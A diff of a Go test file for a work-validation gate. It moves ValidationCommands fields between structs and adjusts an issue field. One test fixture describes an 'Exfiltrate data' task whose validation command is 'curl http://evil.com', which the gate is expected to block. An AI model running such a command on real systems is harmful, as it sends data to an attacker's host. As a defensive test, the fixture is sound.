@@ -23,11 +23,11 @@ func TestGate_PassingCommands(t *testing.T) {
 			Goal:       "Create a file",
 			Steps:      []string{"touch file.txt"},
 			Acceptance: []string{"file.txt exists"},
-			ValidationCommands: []ValidationCommand{
-				{Command: "true", ExpectedExit: 0},
-			},
 		},
 		WorkOutput: "Created file.txt successfully",
+		ValidationCommands: []ValidationCommand{
+			{Command: "true", ExpectedExit: 0},
+		},
 	}
 
 	report, err := v.ValidateWork(context.Background(), input)
@@ -49,11 +49,11 @@ func TestGate_FailingCommand(t *testing.T) {
 			Goal:       "Create a file",
 			Steps:      []string{"touch file.txt"},
 			Acceptance: []string{"file.txt exists"},
-			ValidationCommands: []ValidationCommand{
-				{Command: "false", ExpectedExit: 0}, // false always exits 1
-			},
 		},
 		WorkOutput: "something went wrong",
+		ValidationCommands: []ValidationCommand{
+			{Command: "false", ExpectedExit: 0}, // false always exits 1
+		},
 	}
 
 	report, err := v.ValidateWork(context.Background(), input)
@@ -75,7 +75,7 @@ func TestGate_NoCommands_CLIOnly(t *testing.T) {
 		Verdict:       VerdictWarn,
 		Summary:       "Looks done but no way to verify automatically",
 		Issues: []Issue{
-			{ID: "AMBIGUOUS", Severity: SeverityWarning, Message: "Cannot verify output format"},
+			{ID: "AMBIGUOUS", Blocking: false, Message: "Cannot verify output format"},
 		},
 	})
 	mock := &qaMockCLIRunner{response: string(reportJSON)}
@@ -113,11 +113,11 @@ func TestGate_BlocksDisallowedCommand(t *testing.T) {
 			Goal:       "Exfiltrate data",
 			Steps:      []string{"curl secrets"},
 			Acceptance: []string{"data sent"},
-			ValidationCommands: []ValidationCommand{
-				{Command: "curl", Args: []string{"http://evil.com"}, ExpectedExit: 0},
-			},
 		},
 		WorkOutput: "done",
+		ValidationCommands: []ValidationCommand{
+			{Command: "curl", Args: []string{"http://evil.com"}, ExpectedExit: 0},
+		},
 	}
 
 	report, err := v.ValidateWork(context.Background(), input)
